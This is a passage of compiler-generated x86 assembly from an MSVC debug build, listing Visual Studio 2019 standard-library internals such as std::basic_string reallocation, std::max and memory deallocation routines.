	mov	BYTE PTR __Overflow_is_possible$[ebp], 0
; Line 69
	mov	eax, DWORD PTR __Count$[ebp]
; Line 70
	leave
	ret	0
??$_Get_size_of_n@$00@std@@YAII@Z ENDP			; std::_Get_size_of_n<1>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$addressof@$$CBV?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPBV?$_String_val@U?$_Simple_types@D@std@@@0@ABV10@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@$$CBV?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPBV?$_String_val@U?$_Simple_types@D@std@@@0@ABV10@@Z PROC ; std::addressof<std::_String_val<std::_Simple_types<char> > const >, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xstddef
; Line 274
	push	ebp
	mov	ebp, esp
; Line 275
	mov	eax, DWORD PTR __Val$[ebp]
; Line 276
	pop	ebp
	ret	0
??$addressof@$$CBV?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPBV?$_String_val@U?$_Simple_types@D@std@@@0@ABV10@@Z ENDP ; std::addressof<std::_String_val<std::_Simple_types<char> > const >
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@D@std@@@0@AAV10@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@D@std@@@0@AAV10@@Z PROC ; std::addressof<std::_String_val<std::_Simple_types<char> > >, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xstddef
; Line 274
	push	ebp
	mov	ebp, esp
; Line 275
	mov	eax, DWORD PTR __Val$[ebp]
; Line 276
	pop	ebp
	ret	0
??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@D@std@@@0@AAV10@@Z ENDP ; std::addressof<std::_String_val<std::_Simple_types<char> > >
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$_Deallocate@$07$0A@@std@@YAXPAXI@Z
_TEXT	SEGMENT
__$EHRec$ = -12						; size = 12
__Ptr$ = 8						; size = 4
__Bytes$ = 12						; size = 4
??$_Deallocate@$07$0A@@std@@YAXPAXI@Z PROC		; std::_Deallocate<8,0>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xmemory
; Line 251
	push	ebp
	mov	ebp, esp
	push	-1
	push	__ehhandler$??$_Deallocate@$07$0A@@std@@YAXPAXI@Z
	mov	eax, DWORD PTR fs:0
	push	eax
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	push	eax
	lea	eax, DWORD PTR __$EHRec$[ebp]
	mov	DWORD PTR fs:0, eax
; Line 260
	cmp	DWORD PTR __Bytes$[ebp], 4096		; 00001000H
	jb	SHORT $LN2@Deallocate
; Line 261
	lea	eax, DWORD PTR __Bytes$[ebp]
	push	eax
	lea	eax, DWORD PTR __Ptr$[ebp]
	push	eax
	call	?_Adjust_manually_vector_aligned@std@@YAXAAPAXAAI@Z ; std::_Adjust_manually_vector_aligned
	pop	ecx
	pop	ecx
$LN2@Deallocate:
; Line 264
	push	DWORD PTR __Bytes$[ebp]
	push	DWORD PTR __Ptr$[ebp]
	call	??3@YAXPAXI@Z				; operator delete
	pop	ecx
	pop	ecx
; Line 266
	mov	ecx, DWORD PTR __$EHRec$[ebp]
	mov	DWORD PTR fs:0, ecx
	pop	ecx
	leave
	ret	0
	int	3
	int	3
	int	3
	int	3
	int	3
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__ehhandler$??$_Deallocate@$07$0A@@std@@YAXPAXI@Z:
	npad	1
	npad	1
	mov	edx, DWORD PTR [esp+8]
	lea	eax, DWORD PTR [edx+12]
	mov	ecx, DWORD PTR [edx-4]
	xor	ecx, eax
	call	@__security_check_cookie@4
	mov	eax, OFFSET __ehfuncinfo$??$_Deallocate@$07$0A@@std@@YAXPAXI@Z
	jmp	___CxxFrameHandler3
text$x	ENDS
??$_Deallocate@$07$0A@@std@@YAXPAXI@Z ENDP		; std::_Deallocate<8,0>
; Function compile flags: /Odsp
;	COMDAT ??$max@I@std@@YAABIABI0@Z
_TEXT	SEGMENT
$T1 = -8						; size = 4
tv65 = -4						; size = 4
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??$max@I@std@@YAABIABI0@Z PROC				; std::max<unsigned int>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\utility
; Line 42
	push	ebp
	mov	ebp, esp
	push	ecx
	push	ecx
; Line 44
	mov	eax, DWORD PTR __Left$[ebp]
	mov	ecx, DWORD PTR __Right$[ebp]
	mov	eax, DWORD PTR [eax]
	cmp	eax, DWORD PTR [ecx]
	jae	SHORT $LN3@max
	mov	eax, DWORD PTR __Right$[ebp]
	mov	DWORD PTR tv65[ebp], eax
	jmp	SHORT $LN4@max
$LN3@max:
	mov	eax, DWORD PTR __Left$[ebp]
	mov	DWORD PTR tv65[ebp], eax
$LN4@max:
	mov	eax, DWORD PTR tv65[ebp]
	mov	DWORD PTR $T1[ebp], eax
	mov	eax, DWORD PTR $T1[ebp]
; Line 45
	leave
	ret	0
??$max@I@std@@YAABIABI0@Z ENDP				; std::max<unsigned int>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$_Construct_in_place@PADAAPAD@std@@YAXAAPAD0@Z
_TEXT	SEGMENT
$T1 = -4						; size = 4
__Obj$ = 8						; size = 4
_<_Args_0>$ = 12					; size = 4
??$_Construct_in_place@PADAAPAD@std@@YAXAAPAD0@Z PROC	; std::_Construct_in_place<char *,char * &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xutility
; Line 151
	push	ebp
	mov	ebp, esp
	push	ecx
; Line 158
	push	DWORD PTR __Obj$[ebp]
	call	??$addressof@PAD@std@@YAPAPADAAPAD@Z	; std::addressof<char *>
	pop	ecx
	push	eax
	call	??$_Voidify_iter@PAPAD@std@@YAPAXPAPAD@Z ; std::_Voidify_iter<char * *>
	pop	ecx
	push	eax
	push	4
	call	??2@YAPAXIPAX@Z				; operator new
	pop	ecx
	pop	ecx
	mov	DWORD PTR $T1[ebp], eax
	push	DWORD PTR _<_Args_0>$[ebp]
	call	??$forward@AAPAD@std@@YAAAPADAAPAD@Z	; std::forward<char * &>
	pop	ecx
	mov	ecx, DWORD PTR $T1[ebp]
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR [ecx], eax
; Line 160
	leave
	ret	0
??$_Construct_in_place@PADAAPAD@std@@YAXAAPAD0@Z ENDP	; std::_Construct_in_place<char *,char * &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$_Unfancy@D@std@@YAPADPAD@Z
_TEXT	SEGMENT
__Ptr$ = 8						; size = 4
??$_Unfancy@D@std@@YAPADPAD@Z PROC			; std::_Unfancy<char>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xstddef
; Line 288
	push	ebp
	mov	ebp, esp
; Line 289
	mov	eax, DWORD PTR __Ptr$[ebp]
; Line 290
	pop	ebp
	ret	0
??$_Unfancy@D@std@@YAPADPAD@Z ENDP			; std::_Unfancy<char>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z
_TEXT	SEGMENT
$T1 = -4						; size = 4
__Obj$ = 8						; size = 4
_<_Args_0>$ = 12					; size = 4
??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z PROC ; std::_Construct_in_place<char *,char * const &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xutility
; Line 151
	push	ebp
	mov	ebp, esp
	push	ecx
; Line 158
	push	DWORD PTR __Obj$[ebp]
	call	??$addressof@PAD@std@@YAPAPADAAPAD@Z	; std::addressof<char *>
	pop	ecx
	push	eax
	call	??$_Voidify_iter@PAPAD@std@@YAPAXPAPAD@Z ; std::_Voidify_iter<char * *>
	pop	ecx
	push	eax
	push	4
	call	??2@YAPAXIPAX@Z				; operator new
	pop	ecx
	pop	ecx
	mov	DWORD PTR $T1[ebp], eax
	push	DWORD PTR _<_Args_0>$[ebp]
	call	??$forward@ABQAD@std@@YAABQADABQAD@Z	; std::forward<char * const &>
	pop	ecx
	mov	ecx, DWORD PTR $T1[ebp]
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR [ecx], eax
; Line 160
	leave
	ret	0
??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z ENDP ; std::_Construct_in_place<char *,char * const &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$_Reallocate_grow_by@V<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@Z
_TEXT	SEGMENT
__Raw_new$ = -40					; size = 4
__Al$ = -36						; size = 4
__Old_ptr$1 = -32					; size = 4
__Old_capacity$ = -28					; size = 4
__New_capacity$ = -24					; size = 4
__New_size$ = -20					; size = 4
__New_ptr$ = -16					; size = 4
__Old_size$ = -12					; size = 4
_this$ = -8						; size = 4
__My_data$ = -4						; size = 4
__Size_increase$ = 8					; size = 4
__Fn$ = 12						; size = 1
_<_Args_0>$ = 16					; size = 4
_<_Args_1>$ = 20					; size = 4
??$_Reallocate_grow_by@V<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_ab246b20b9526e2ef7792587e4298a77>,char const *,unsigned int>, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xstring
; Line 4538
	push	ebp
	mov	ebp, esp
	sub	esp, 40					; 00000028H
	mov	DWORD PTR _this$[ebp], ecx
; Line 4541
	mov	eax, DWORD PTR _this$[ebp]
	mov	DWORD PTR __My_data$[ebp], eax
; Line 4542
	mov	eax, DWORD PTR __My_data$[ebp]
	mov	eax, DWORD PTR [eax+16]
	mov	DWORD PTR __Old_size$[ebp], eax
; Line 4543
	mov	ecx, DWORD PTR _this$[ebp]
	call	?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
	sub	eax, DWORD PTR __Old_size$[ebp]
	cmp	eax, DWORD PTR __Size_increase$[ebp]
	jae	SHORT $LN2@Reallocate
; Line 4544
	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
$LN2@Reallocate:
; Line 4547
	mov	eax, DWORD PTR __Old_size$[ebp]
	add	eax, DWORD PTR __Size_increase$[ebp]
	mov	DWORD PTR __New_size$[ebp], eax
; Line 4548
	mov	eax, DWORD PTR __My_data$[ebp]
	mov	eax, DWORD PTR [eax+20]
	mov	DWORD PTR __Old_capacity$[ebp], eax
; Line 4549
	push	DWORD PTR __New_size$[ebp]
	mov	ecx, DWORD PTR _this$[ebp]
	call	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEII@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
	mov	DWORD PTR __New_capacity$[ebp], eax
; Line 4550
	mov	ecx, DWORD PTR _this$[ebp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	DWORD PTR __Al$[ebp], eax
; Line 4551
	mov	eax, DWORD PTR __New_capacity$[ebp]
	inc	eax
	push	eax
	mov	ecx, DWORD PTR __Al$[ebp]
	call	?allocate@?$allocator@D@std@@QAEPADI@Z	; std::allocator<char>::allocate
	mov	DWORD PTR __New_ptr$[ebp], eax
; Line 4558
	mov	ecx, DWORD PTR __My_data$[ebp]
	call	?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all
; Line 4559
	mov	eax, DWORD PTR __My_data$[ebp]
	mov	ecx, DWORD PTR __New_size$[ebp]
	mov	DWORD PTR [eax+16], ecx
; Line 4560
	mov	eax, DWORD PTR __My_data$[ebp]
	mov	ecx, DWORD PTR __New_capacity$[ebp]
	mov	DWORD PTR [eax+20], ecx
; Line 4561
	push	DWORD PTR __New_ptr$[ebp]
	call	??$_Unfancy@D@std@@YAPADPAD@Z		; std::_Unfancy<char>
	pop	ecx
	mov	DWORD PTR __Raw_new$[ebp], eax
; Line 4562
	cmp	DWORD PTR __Old_capacity$[ebp], 16	; 00000010H
	jb	SHORT $LN3@Reallocate
; Line 4563
	mov	eax, DWORD PTR __My_data$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR __Old_ptr$1[ebp], eax
; Line 4564
	push	DWORD PTR _<_Args_1>$[ebp]
	push	DWORD PTR _<_Args_0>$[ebp]
	push	DWORD PTR __Old_size$[ebp]
	push	DWORD PTR __Old_ptr$1[ebp]
	call	??$_Unfancy@D@std@@YAPADPAD@Z		; std::_Unfancy<char>
	pop	ecx
	push	eax
	push	DWORD PTR __Raw_new$[ebp]
	lea	ecx, DWORD PTR __Fn$[ebp]
	call	??R<lambda_ab246b20b9526e2ef7792587e4298a77>@@QBE@QADQBDI1I@Z ; <lambda_ab246b20b9526e2ef7792587e4298a77>::operator()
; Line 4565
	mov	eax, DWORD PTR __Old_capacity$[ebp]
	inc	eax
	push	eax
	push	DWORD PTR __Old_ptr$1[ebp]
	mov	ecx, DWORD PTR __Al$[ebp]
	call	?deallocate@?$allocator@D@std@@QAEXQADI@Z ; std::allocator<char>::deallocate
; Line 4566
	mov	eax, DWORD PTR __My_data$[ebp]
	mov	ecx, DWORD PTR __New_ptr$[ebp]
	mov	DWORD PTR [eax], ecx
; Line 4567
	jmp	SHORT $LN4@Reallocate
$LN3@Reallocate:
; Line 4568
	push	DWORD PTR _<_Args_1>$[ebp]
	push	DWORD PTR _<_Args_0>$[ebp]
	push	DWORD PTR __Old_size$[ebp]
	push	DWORD PTR __My_data$[ebp]
	push	DWORD PTR __Raw_new$[ebp]
	lea	ecx, DWORD PTR __Fn$[ebp]
	call	??R<lambda_ab246b20b9526e2ef7792587e4298a77>@@QBE@QADQBDI1I@Z ; <lambda_ab246b20b9526e2ef7792587e4298a77>::operator()
; Line 4569
	lea	eax, DWORD PTR __New_ptr$[ebp]
	push	eax
	push	DWORD PTR __My_data$[ebp]
	call	??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z ; std::_Construct_in_place<char *,char * const &>
	pop	ecx
	pop	ecx
$LN4@Reallocate:
; Line 4572
	mov	eax, DWORD PTR _this$[ebp]
$LN5@Reallocate:
; Line 4573
	leave
	ret	16					; 00000010H
??$_Reallocate_grow_by@V<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_ab246b20b9526e2ef7792587e4298a77>,char const *,unsigned int>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??R<lambda_ab246b20b9526e2ef7792587e4298a77>@@QBE@QADQBDI1I@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__New_ptr$ = 8						; size = 4
__Old_ptr$ = 12						; size = 4
__Old_size$ = 16					; size = 4
__Ptr$ = 20						; size = 4
__Count$ = 24						; size = 4
??R<lambda_ab246b20b9526e2ef7792587e4298a77>@@QBE@QADQBDI1I@Z PROC ; <lambda_ab246b20b9526e2ef7792587e4298a77>::operator(), COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xstring
; Line 3166
	push	ebp
	mov	ebp, esp
	push	ecx
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 3167
	push	DWORD PTR __Old_size$[ebp]
	push	DWORD PTR __Old_ptr$[ebp]
	push	DWORD PTR __New_ptr$[ebp]
	call	?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
	add	esp, 12					; 0000000cH
; Line 3168
	push	DWORD PTR __Count$[ebp]
	push	DWORD PTR __Ptr$[ebp]
	mov	eax, DWORD PTR __New_ptr$[ebp]
	add	eax, DWORD PTR __Old_size$[ebp]
	push	eax
	call	?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
	add	esp, 12					; 0000000cH
; Line 3169
	mov	BYTE PTR $T1[ebp], 0
	lea	eax, DWORD PTR $T1[ebp]
	push	eax
	mov	eax, DWORD PTR __Old_size$[ebp]
	add	eax, DWORD PTR __Count$[ebp]
	add	eax, DWORD PTR __New_ptr$[ebp]
	push	eax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
	pop	ecx
	pop	ecx
; Line 3170
	leave
	ret	20					; 00000014H
??R<lambda_ab246b20b9526e2ef7792587e4298a77>@@QBE@QADQBDI1I@Z ENDP ; <lambda_ab246b20b9526e2ef7792587e4298a77>::operator()
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$_Reallocate_for@V<lambda_9366063389c5f42a00a5088cf24e69de>@@PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_9366063389c5f42a00a5088cf24e69de>@@PBD@Z
_TEXT	SEGMENT
__Al$ = -20						; size = 4
__Old_capacity$ = -16					; size = 4
__New_capacity$ = -12					; size = 4
__New_ptr$ = -8						; size = 4
_this$ = -4						; size = 4
__New_size$ = 8						; size = 4
__Fn$ = 12						; size = 1
_<_Args_0>$ = 16					; size = 4
??$_Reallocate_for@V<lambda_9366063389c5f42a00a5088cf24e69de>@@PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_9366063389c5f42a00a5088cf24e69de>@@PBD@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_for<<lambda_9366063389c5f42a00a5088cf24e69de>,char const *>, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xstring
; Line 4505
	push	ebp
	mov	ebp, esp
	sub	esp, 20					; 00000014H
	mov	DWORD PTR _this$[ebp], ecx
; Line 4508
	mov	ecx, DWORD PTR _this$[ebp]
	call	?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
	cmp	DWORD PTR __New_size$[ebp], eax
	jbe	SHORT $LN2@Reallocate
; Line 4509
	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
$LN2@Reallocate:
; Line 4512
	mov	eax, DWORD PTR _this$[ebp]
	mov	eax, DWORD PTR [eax+20]
	mov	DWORD PTR __Old_capacity$[ebp], eax
; Line 4513
	push	DWORD PTR __New_size$[ebp]
	mov	ecx, DWORD PTR _this$[ebp]
	call	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEII@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
	mov	DWORD PTR __New_capacity$[ebp], eax
; Line 4514
	mov	ecx, DWORD PTR _this$[ebp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	DWORD PTR __Al$[ebp], eax
; Line 4515
	mov	eax, DWORD PTR __New_capacity$[ebp]
	inc	eax
	push	eax
	mov	ecx, DWORD PTR __Al$[ebp]
	call	?allocate@?$allocator@D@std@@QAEPADI@Z	; std::allocator<char>::allocate
	mov	DWORD PTR __New_ptr$[ebp], eax
; Line 4522
	mov	ecx, DWORD PTR _this$[ebp]
	call	?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all
; Line 4523
	mov	eax, DWORD PTR _this$[ebp]
	mov	ecx, DWORD PTR __New_size$[ebp]
	mov	DWORD PTR [eax+16], ecx
; Line 4524
	mov	eax, DWORD PTR _this$[ebp]
	mov	ecx, DWORD PTR __New_capacity$[ebp]
	mov	DWORD PTR [eax+20], ecx
; Line 4525
	push	DWORD PTR _<_Args_0>$[ebp]
	push	DWORD PTR __New_size$[ebp]
	push	DWORD PTR __New_ptr$[ebp]
	call	??$_Unfancy@D@std@@YAPADPAD@Z		; std::_Unfancy<char>
	pop	ecx
	push	eax
	lea	ecx, DWORD PTR __Fn$[ebp]
	call	??R<lambda_9366063389c5f42a00a5088cf24e69de>@@QBE@QADIQBD@Z ; <lambda_9366063389c5f42a00a5088cf24e69de>::operator()
; Line 4526
	cmp	DWORD PTR __Old_capacity$[ebp], 16	; 00000010H
	jb	SHORT $LN3@Reallocate
; Line 4527
	mov	eax, DWORD PTR __Old_capacity$[ebp]
	inc	eax
	push	eax
	mov	eax, DWORD PTR _this$[ebp]
	push	DWORD PTR [eax]
	mov	ecx, DWORD PTR __Al$[ebp]
	call	?deallocate@?$allocator@D@std@@QAEXQADI@Z ; std::allocator<char>::deallocate
; Line 4528
	mov	eax, DWORD PTR _this$[ebp]
	mov	ecx, DWORD PTR __New_ptr$[ebp]
	mov	DWORD PTR [eax], ecx
; Line 4529
	jmp	SHORT $LN4@Reallocate
$LN3@Reallocate:
; Line 4530
	lea	eax, DWORD PTR __New_ptr$[ebp]
	push	eax
	push	DWORD PTR _this$[ebp]
	call	??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z ; std::_Construct_in_place<char *,char * const &>
	pop	ecx
	pop	ecx
$LN4@Reallocate:
; Line 4533
	mov	eax, DWORD PTR _this$[ebp]
$LN5@Reallocate:
; Line 4534
	leave
	ret	12					; 0000000cH
??$_Reallocate_for@V<lambda_9366063389c5f42a00a5088cf24e69de>@@PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_9366063389c5f42a00a5088cf24e69de>@@PBD@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_for<<lambda_9366063389c5f42a00a5088cf24e69de>,char const *>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??R<lambda_9366063389c5f42a00a5088cf24e69de>@@QBE@QADIQBD@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__New_ptr$ = 8						; size = 4
__Count$ = 12						; size = 4
__Ptr$ = 16						; size = 4
??R<lambda_9366063389c5f42a00a5088cf24e69de>@@QBE@QADIQBD@Z PROC ; <lambda_9366063389c5f42a00a5088cf24e69de>::operator(), COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xstring
; Line 3256
	push	ebp
	mov	ebp, esp
	push	ecx
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 3257
	push	DWORD PTR __Count$[ebp]
	push	DWORD PTR __Ptr$[ebp]
	push	DWORD PTR __New_ptr$[ebp]
	call	?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
	add	esp, 12					; 0000000cH
; Line 3258
	mov	BYTE PTR $T1[ebp], 0
	lea	eax, DWORD PTR $T1[ebp]
	push	eax
	mov	eax, DWORD PTR __New_ptr$[ebp]
	add	eax, DWORD PTR __Count$[ebp]
	push	eax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
	pop	ecx
	pop	ecx
; Line 3259
	leave
	ret	12					; 0000000cH
??R<lambda_9366063389c5f42a00a5088cf24e69de>@@QBE@QADIQBD@Z ENDP ; <lambda_9366063389c5f42a00a5088cf24e69de>::operator()
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$_Reallocate_grow_by@V<lambda_15711c68e099a15a58f4d77303cb286d>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_15711c68e099a15a58f4d77303cb286d>@@D@Z
_TEXT	SEGMENT
__Raw_new$ = -40					; size = 4
__Al$ = -36						; size = 4
__Old_ptr$1 = -32					; size = 4
__Old_capacity$ = -28					; size = 4
__New_capacity$ = -24					; size = 4
__New_size$ = -20					; size = 4
__New_ptr$ = -16					; size = 4
__Old_size$ = -12					; size = 4
_this$ = -8						; size = 4
__My_data$ = -4						; size = 4
__Size_increase$ = 8					; size = 4
__Fn$ = 12						; size = 1
_<_Args_0>$ = 16					; size = 1
??$_Reallocate_grow_by@V<lambda_15711c68e099a15a58f4d77303cb286d>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_15711c68e099a15a58f4d77303cb286d>@@D@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_15711c68e099a15a58f4d77303cb286d>,char>, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xstring
; Line 4538
	push	ebp
	mov	ebp, esp
	sub	esp, 40					; 00000028H
	mov	DWORD PTR _this$[ebp], ecx
; Line 4541
	mov	eax, DWORD PTR _this$[ebp]
	mov	DWORD PTR __My_data$[ebp], eax
; Line 4542
	mov	eax, DWORD PTR __My_data$[ebp]
	mov	eax, DWORD PTR [eax+16]
	mov	DWORD PTR __Old_size$[ebp], eax
; Line 4543
	mov	ecx, DWORD PTR _this$[ebp]
	call	?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
	sub	eax, DWORD PTR __Old_size$[ebp]
	cmp	eax, DWORD PTR __Size_increase$[ebp]
	jae	SHORT $LN2@Reallocate
; Line 4544
	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
$LN2@Reallocate:
; Line 4547
	mov	eax, DWORD PTR __Old_size$[ebp]
	add	eax, DWORD PTR __Size_increase$[ebp]
	mov	DWORD PTR __New_size$[ebp], eax
; Line 4548
	mov	eax, DWORD PTR __My_data$[ebp]
	mov	eax, DWORD PTR [eax+20]
	mov	DWORD PTR __Old_capacity$[ebp], eax
; Line 4549
	push	DWORD PTR __New_size$[ebp]
	mov	ecx, DWORD PTR _this$[ebp]
	call	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEII@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
	mov	DWORD PTR __New_capacity$[ebp], eax
; Line 4550
	mov	ecx, DWORD PTR _this$[ebp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	DWORD PTR __Al$[ebp], eax
; Line 4551
	mov	eax, DWORD PTR __New_capacity$[ebp]
	inc	eax
	push	eax
	mov	ecx, DWORD PTR __Al$[ebp]
	call	?allocate@?$allocator@D@std@@QAEPADI@Z	; std::allocator<char>::allocate
	mov	DWORD PTR __New_ptr$[ebp], eax
; Line 4558
	mov	ecx, DWORD PTR __My_data$[ebp]
	call	?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all
; Line 4559
	mov	eax, DWORD PTR __My_data$[ebp]
	mov	ecx, DWORD PTR __New_size$[ebp]
	mov	DWORD PTR [eax+16], ecx
; Line 4560
	mov	eax, DWORD PTR __My_data$[ebp]
	mov	ecx, DWORD PTR __New_capacity$[ebp]
	mov	DWORD PTR [eax+20], ecx
; Line 4561
	push	DWORD PTR __New_ptr$[ebp]
	call	??$_Unfancy@D@std@@YAPADPAD@Z		; std::_Unfancy<char>
	pop	ecx
	mov	DWORD PTR __Raw_new$[ebp], eax
; Line 4562
	cmp	DWORD PTR __Old_capacity$[ebp], 16	; 00000010H
	jb	SHORT $LN3@Reallocate
; Line 4563
	mov	eax, DWORD PTR __My_data$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR __Old_ptr$1[ebp], eax
; Line 4564
	push	DWORD PTR _<_Args_0>$[ebp]
	push	DWORD PTR __Old_size$[ebp]
	push	DWORD PTR __Old_ptr$1[ebp]
	call	??$_Unfancy@D@std@@YAPADPAD@Z		; std::_Unfancy<char>
	pop	ecx
	push	eax
	push	DWORD PTR __Raw_new$[ebp]
	lea	ecx, DWORD PTR __Fn$[ebp]
